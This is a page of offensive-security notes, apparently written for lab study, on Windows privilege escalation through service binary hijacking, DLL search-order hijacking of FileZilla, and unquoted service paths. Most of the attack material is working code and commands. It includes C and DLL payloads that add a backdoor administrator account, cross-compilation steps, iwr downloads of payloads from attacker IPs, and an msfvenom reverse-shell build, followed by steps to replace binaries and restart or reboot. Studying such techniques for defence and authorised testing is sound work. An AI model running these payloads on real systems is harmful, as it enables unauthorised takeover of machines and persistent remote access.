---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Services

A **Windows service** is a background process managed by the **Service Control Manager**. Services can be controlled using **services snap-in** (`services.msc`), **PowerShell**, or **`sc.exe`** (command-line tool). They run under specific built-in accounts:

* **LocalSystem:** High privileges (includes `SYSTEM` and `Administrator` SIDs)
* **Network Service:** Limited privileges with network access
* **Local Service:** Limited privileges without network access

> _Services can also run under **custom user accounts** (local or domain users)._

## Service Binary Hijacking <a href="#service-binary-hijacking" id="service-binary-hijacking"></a>

> _For automated Service Binary Hijacking see_ [_`PowerUp`_](../../../tools/active-directory/powerup.md#service-binary-hijacking)_._

Every Windows service has an associated **binary file** that runs when the service starts. If the binaryâ€™s permissions are misconfigured, a low-privileged user may replace it with a malicious file and execute it with higher privileges (e.g., `LocalSystem`).

For example, a developer might install a service but fail to restrict permissions, allowing all users to modify the binary. As a result, an attacker could **replace the binary with a malicious file** and then restart the service (or reboot the system), triggering the malicious code to run with elevated privileges.

> _To list Windows services and their binaries we can use the GUI app `services.msc`, or the `Get-Service` and `Get-CimInstance` cmdlets._

{% code overflow="wrap" %}
```powershell
# Filter running services and their executable paths
> Get-CimInstance -ClassName win32_service | Select Name, State, PathName | Where-Object { $_.State -eq "Running" }

Name                      State   PathName
----                      -----   --------
Apache2.4                 Running "C:\xampp\apache\bin\httpd.exe" -k runservice
Appinfo                   Running C:\Windows\system32\svchost.exe -k netsvcs -p
AppXSvc                   Running C:\Windows\system32\svchost.exe -k wsappx -p
AudioEndpointBuilder      Running C:\Windows\System32\svchost.exe -k LocalSystemNetworkRestricted -p
Audiosrv                  Running C:\Windows\System32\svchost.exe -k LocalServiceNetworkRestricted -p
BFE                       Running C:\Windows\system32\svchost.exe -k LocalServiceNoNetworkFirewall -p
BITS                      Running C:\Windows\System32\svchost.exe -k netsvcs -p
BrokerInfrastructure      Running C:\Windows\system32\svchost.exe -k DcomLaunch -p
...
mysql                     Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
```
{% endcode %}

> _**Network logons** (e.g., WinRM, bind shells) **may fail** when querying services as a non-admin user, while **interactive logins** (e.g., **RDP**) work without permission issues._

From the list above, the binaries located in the `C:\xampp` instead of the `C:\Windows\System32` directory (`apache2.4` and `mysql`) stand out because this means that these services are user-installed and are, therefore, susceptible to permission misconfigurations. We can enumerate their permissions using `icacls` or `Get-ACL` .

| Mask | Permissions    |
| ---- | -------------- |
| `F`  | Full Access    |
| `M`  | Modify Access  |
| `RX` | Read & Execute |
| `R`  | Read-only      |
| `W`  | Write-ony      |

```powershell
> icacls "C:\xampp\apache\bin\httpd.exe"
C:\xampp\apache\bin\httpd.exe BUILTIN\Administrators:(F)
                              NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Users:(RX)
                              NT AUTHORITY\Authenticated Users:(RX)

Successfully processed 1 files; Failed processing 0 files

> icacls "C:\xampp\mysql\bin\mysqld.exe"
C:\xampp\mysql\bin\mysqld.exe NT AUTHORITY\SYSTEM:(F)
                              BUILTIN\Administrators:(F)
                              BUILTIN\Users:(F)

Successfully processed 1 files; Failed processing 0 files
```

We will create a small binary to replace the original `mysqld.exe`. This will create the user `dave2` and add him to the local administrators group using the `system` function.

{% tabs %}
{% tab title="1. Payload" %}
{% code title="addUser.c" %}
```c
#include <stdlib.h>

int main ()
{
  int i;
  
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  
  return 0;
}
```
{% endcode %}
{% endtab %}

{% tab title="2. Cross-compile" %}
```bash
$ x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```
{% endtab %}

{% tab title="3. Transfer" %}
{% code overflow="wrap" %}
```powershell
> iwr -uri http://192.168.45.231/adduser.exe -Outfile adduser.exe
```
{% endcode %}
{% endtab %}

{% tab title="4. Replace" %}
```powershell
# backup the original
> move C:\xampp\mysql\bin\mysqld.exe mysqld.exe
# replace
> move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe
```
{% endtab %}

{% tab title="5. Restart" %}
```powershell
# service status
> Get-Service -Name 'BackupMonitor'

Status   Name               DisplayName
------   ----               -----------
Running  BackupMonitor      BackupMonitor

# stop the service
> net stop mysql
> Stop-Service -Name 'BackupMonitor' -Force

# start the service
> Start-Service -Name 'BackupMonitor'

# restart the service directly
> Restart-Service -Name 'BackupMonitor' -Force
```
{% endtab %}
{% endtabs %}

If the user does not have to restart the service but has the `SeShutDownPrivilege` assigned and the `StartMode` of the service is set to `Auto`, we can just reboot the system.

{% tabs %}
{% tab title="1. Failed Restart" %}
```powershell
> net stop mysql
System error 5 has occurred.

Access is denied.
```
{% endtab %}

{% tab title="2. StartMode" %}
{% code overflow="wrap" %}
```powershell
> Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}

Name  StartMode
----  ---------
mysql Auto
```
{% endcode %}
{% endtab %}

{% tab title="3. SeShutDownPrivilege" %}
{% code overflow="wrap" %}
```powershell
# The Disabled state only indicates if the privilege is currently enabled for the running process.
> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeSecurityPrivilege           Manage auditing and security log     Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
<SNIP>
```
{% endcode %}
{% endtab %}

{% tab title="4. Reboot" %}
```powershell
# 'r' -> reboot, 't 0' -> in zero seconds
> shutdown /r /t 0 
```
{% endtab %}
{% endtabs %}

> _To restore the original state of the service, we have to delete our binary `mysqld.exe`, restore the backed up original binary, and restart the system._

We can also get a reverse shell by replacing the binary with the following.

{% code overflow="wrap" %}
```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.231 LPORT=4444 -f exe > BackupMonitor.exe
```
{% endcode %}

## DLL Hijacking <a href="#dll-hijacking" id="dll-hijacking"></a>

If binary service hijacking isn't possible due to permission restrictions, DLL hijacking, a more **stealthier** method, can be used. DLLs are essential components that provide shared functionality to Windows programs. By **replacing a DLL** that a service depends on, malicious code can be injected while maintaining the service's functionality.

> DLLs are called _**Shared Objects**_ _on Unix._

When a program needs a DLL, Windows follows a predefined search order to locate it. To improve security, Microsoft introduced **safe DLL search mode**_,_ which prioritizes system directories to prevent unauthorized DLL loading. The standard search order is:

```
1. The directory from which the application loaded.
2. The System directory.
3. The 16-bit System directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

However, if a program looks for a **missing DLL** (due to installation issues or updates), a malicious DLL can be placed with the same name in a directory higher in the search order, a technique known as **DLL search order hijacking**.

{% code overflow="wrap" %}
```powershell
> Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

displayname
-----------

FileZilla 3.63.1
<SNIP>
```
{% endcode %}

Filezilla 3.63.1 has a [DLL hijacking vulnerability](https://www.exploit-db.com/exploits/51267) related to the `TextShaping.dll` file. We first need to check if we have write access to the DLL's location.

```powershell
> echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
> type 'C:\FileZilla\FileZilla FTP Client\test.txt'
test
```

The typical process of checking which DLLs are used by an application is via the **Process Monitor** tool. Once we have a list of DLLs used by the service binary, we can check their permissions and if they can be replaced with a malicious DLL. **To start the Process Monitor we need elevated privileges**. To address this issue, we can copy the service binary to a local machine.

<figure><img src="https://x7331.gitbook.io/~gitbook/image?url=https%3A%2F%2F3960676229-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FmjLkek16kB60c2WFd5lf%252Fuploads%252Fd67CI5VK212zdmL6Gvkg%252Fprocmon_1.png%3Falt%3Dmedia%26token%3D8403bd8d-da67-49e2-954c-af1fef9267df&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=17324cd2&#x26;sv=2" alt=""><figcaption></figcaption></figure>

After filtering the results, we can click _Clear_ (red bin icon) and start the process we are interested in. Since we are interested specifically in the `TextShaping.dll` we can create another filter targeting that.

<figure><img src="https://x7331.gitbook.io/~gitbook/image?url=https%3A%2F%2F3960676229-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FmjLkek16kB60c2WFd5lf%252Fuploads%252FBSP0wbThY6RBe4sGUAI2%252Fprocmon_2.png%3Falt%3Dmedia%26token%3Dd8d03059-412c-4724-96e1-8659f8c565da&#x26;width=768&#x26;dpr=4&#x26;quality=100&#x26;sign=6debbcd0&#x26;sv=2" alt=""><figcaption></figcaption></figure>

Based on the above screenshot, the binary tries to load the `TextShaping.dll` from `C:\Filezilla\Filezilla FTP Client\` and it can't find it. It then proceeds to search and find it from `C:\Windows\System32\`. Each DLL can have an optional **entry point function** named `DllMain`, which is executed when processes or threads attach the DLL. This function generally contains four cases named:

1. `DLL_PROCESS_ATTACH`
2. `DLL_THREAD_ATTACH`
3. `DLL_THREAD_DETACH`
4. `DLL_PROCESS_DETACH`

These cases handle situations when the DLL is loaded or unloaded by a process or thread. They are commonly used to perform initialization tasks for the DLL or tasks related to exiting the DLL. If a DLL doesn't have a `DllMain` entry point function, it only provides resources. We are interested in the `DLL_PROCESS_ATTACH` section of the code, since this is used when a process is loading the DLL.

{% tabs %}
{% tab title="Payload" %}
{% code title="dll_hijacking.cpp" %}
```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave3 password123! /add");
  	    i = system ("net localgroup administrators dave3 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```
{% endcode %}
{% endtab %}

{% tab title="Cross-compile" %}
```bash
# cross-compile the script on the attacking machine
$ x86_64-w64-mingw32-gcc dll_hijacking.cpp --shared -o TextShaping.dll
```
{% endtab %}

{% tab title="Transfer" %}
{% code overflow="wrap" %}
```powershell
> iwr -uri http://192.168.45.236/TextShaping.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```
{% endcode %}
{% endtab %}
{% endtabs %}

In order for the DLL hijacking to trigger the FileZilla FTP Client needs to be started, however, it is important to keep in mind that **the privileges the DLL will run with depend on the privileges used to start the application**. If we were to start the FTP client as the user `steve` then we would not have the required privileges to add a new user to the system and place them in the `Administrators` group.

## Unquoted Service Paths <a href="#unquoted-service-paths" id="unquoted-service-paths"></a>

> _For automated enumeration and exploitation of this vector, see_ [_here_](../../../tools/active-directory/powerup.md#unquoted-service-paths)_._

1. Each Windows service maps to an executable file.
2. When a service starts, a process is created via the `CreateProcess` function.
3. The first parameter of this function, `IpApplicationName`, specifies the name and, optionally, the executable path. If the latter is an unquoted string that contains spaces, it can be used as a privilege escalation vector due to how Windows interprets the path.&#x20;

For example, `C:\Program Files\My Program\My Service\service.exe` will be interpreted as:

```
C:\Program.exe
C:\Program Files\My.exe
C:\Program Files\My Program\My.exe
C:\Program Files\My Program\My service\service.exe
```

We can exploit this by creating a malicious executable in any of the paths before the original one. This will result in the former executing with the same privileges that the service starts with, typically, `LocalSystem`.

### **Example**

{% tabs %}
{% tab title="1. Service Enum" %}
{% code overflow="wrap" %}
```powershell
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName 

Name          State   PathName
----          -----   --------
...
GammaService  Stopped C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
...

# a more efficient cmd alternative
# /i -> case insensitive
# /v -> don't match (outside the Windows dir for permission issues and without quotes)
C:\Users\steve> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
Name                                       PathName                                                                     
...                                                                                                         
GammaService                               C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
{% endcode %}
{% endtab %}

{% tab title="2. Restart Perms" %}
```powershell
PS C:\Users\steve> Start-Service GammaService
WARNING: Waiting for service 'GammaService (GammaService)' to start...

PS C:\Users\steve> Stop-Service GammaService
```
{% endtab %}

{% tab title="3. Paths" %}
```powershell
C:\Program.exe
C:\Program Files\Enterprise.exe
C:\Program Files\Enterprise Apps\Current.exe
C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```
{% endtab %}

{% tab title="4. Perms" %}
```powershell
PS C:\Users\steve> icacls "C:\"
<SNIP>
    BUILTIN\Users:(OI)(CI)(RX)
    NT AUTHORITY\Authenticated Users:(OI)(CI)(IO)(M)
    NT AUTHORITY\Authenticated Users:(AD)
<SNIP>
    
PS C:\Users\steve>icacls "C:\Program Files"
<SNIP>
    BUILTIN\Users:(RX)
    BUILTIN\Users:(OI)(CI)(IO)(GR,GE)
<SNIP>

PS C:\Users\steve> icacls "C:\Program Files\Enterprise Apps"
<SNIP>
    BUILTIN\Users:(OI)(CI)(RX,W) # Write permissions!
<SNIP>
```
{% endtab %}
{% endtabs %}

{% tabs %}
{% tab title="5. Payload" %}
{% code title="Current.c" %}
```c
#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");

  return 0;
}
```
{% endcode %}
{% endtab %}

{% tab title="6. Cross-compile" %}
```bash
# cross-compile the script on the attacking machine
$ x86_64-w64-mingw32-gcc Current.c --shared -o Current.exe
```
{% endtab %}

{% tab title="7. Transfer" %}
{% code overflow="wrap" %}
```powershell
> iwr -uri http://192.168.45.235/Current.exe -OutFile 'C:\Program Files\Enterprise Apps\Current.exe'
```
{% endcode %}
{% endtab %}

{% tab title="8. Exploit" %}
{% code overflow="wrap" %}
```powershell
PS C:\Users\steve> Start-Service GammaService
Start-Service : Service 'GammaService (GammaService)' cannot be started due to the following
error: Cannot start service GammaService on computer '.'.
At line:1 char:1
+ Start-Service GammaService
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : OpenError: (System.ServiceProcess.ServiceController:ServiceControl
   ler) [Start-Service], ServiceCommandException
    + FullyQualifiedErrorId : CouldNotStartService,Microsoft.PowerShell.Commands.StartServiceCom
   mand
```
{% endcode %}
{% endtab %}

{% tab title="9. Confirm" %}
```powershell
PS C:\Users\steve> net user

User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2 # user created!
<SNIP>

PS C:\Users\steve> Get-LocalGroupMember administrators

ObjectClass Name                      PrincipalSource
----------- ----                      ---------------
User        CLIENTWK220\Administrator Local
User        CLIENTWK220\BackupAdmin   Local
User        CLIENTWK220\dave2         Local # user added to the admin's group!
User        CLIENTWK220\daveadmin     Local
User        CLIENTWK220\offsec        Local
```
{% endtab %}
{% endtabs %}
